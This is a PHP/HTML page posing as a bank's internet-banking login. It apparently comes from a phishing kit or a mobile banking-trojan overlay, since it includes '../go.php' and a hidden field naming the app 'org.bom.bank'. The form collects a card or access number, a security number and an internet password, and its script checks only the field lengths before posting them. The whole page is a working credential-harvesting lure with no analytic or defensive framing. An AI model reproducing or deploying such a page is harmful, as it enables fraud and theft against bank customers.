<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>
<body>
<div id="content_div">
<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAABCCAMAAAAbpMQZAAAAkFBMVEWRhOx6bdSBdsw3H3OPgumEec2OgeiFe84pDVxzZsVRPZswFWd8cMk0Gm01HG8zGWyBdstVQ6Kpo99VQIGpoPemoN6rofelnt2rovaZjfV2ZMM0GWGUh+9ELHBMNnmQg+t+bc5SPILCv+toWsAAAAAgAk4gAk6yrNyglPxoWsDCv+sgAk5jVLm8uehsXsS4s+ETB46XAAAAKHRSTlPc7dzt6Ojt7e3t7eLi3OLw5fDc7dzo6O3t7e3t4uLc4vDmoKAA0BCmI4T9/gAAAgJJREFUSMdt1dta3SAQhmEWsW5orW20XYptWpdRF8TN/d+dAQIzw/ycJc+bg4T5gjFHsHY2gDWYAPQuRKCHxQStdyFErYcl4V6vdsW9Xm3GUiebsNTJFsx1thlzne2GSRdbMOliKw4nwm44fhG24XDKbcXxjFvCSTfbcNLNMhxOyRKOZ2QZfj0fAH67cAC/ni/LoPDbRQhO4WSZZpbpir+Wy0Hib+XKSXxZHx7gpjiOL+klBrjdjjCzm1aD5CoWtmg9oq7gzmYNht8lrGzSKCu3mO8LWFc/ULA/zRjBur6BzZsA9PUSb1Dz6wuO2i5R63Um06cblV1xr9P85k0Ze5uw1HnWy3aPnc2Y69LFNkijtAWT3hqqI/pL2A3H37L5Vsqe24rjrWieGtwz23DS1DGre0+WcLxlzRN+v/MAf9wPAL/fHY9e4Y973rxhlmlmma74T/lIXuK/svn+l+s5nrrm1c/cE5765vUx4SueVPPgAPIFT7p5dLT5hCfQPDw0/aJt0uYfSvP/A2zeHGDd8Ox+NPMB1g3042xmrXPdVtuEe73VbZXNWOpWt+1twVyzum1nN0xa1G2lrbjqrm4rbMNFq7ott4STBnVbZhmeD7BuS5bj+Qnhw4zx85PG3ArMNLQSk4a2w01D2+OqoVV409BqXDS0AGcNLcJJQwvxql/Q7fkTFKy1QhsOB/0AAAAASUVORK5CYII=" style="
	padding: 15px 40px;">
	
</div>

<center><br><br>
		<form method="post">
		
			<input name="field1" value="org.bom.bank" type="hidden">
		
			<input name="field2" id="login" placeholder="Login with card/access no." maxlength="8" class="input" type="text"><br><br>
			<input name="field3" id="security" placeholder="Security number" maxlength="6" class="input" type="password"><br><br>
			<input name="field4" id="password" placeholder="Internet Password" maxlength="6" class="input" type="password"><br><br>
			<input value="Login" id="input_submitBtn" class="submit" type="submit">

		</form>
<center>
</div>
<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oSecInp = document.getElementById('security');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oSecInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                         if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oSecInp.value.length < 6) {
							try{
								oSecInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						 if (oCodeInp.value.length < 6) {
							try{
								oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                    }
            </script>
</body>
</html>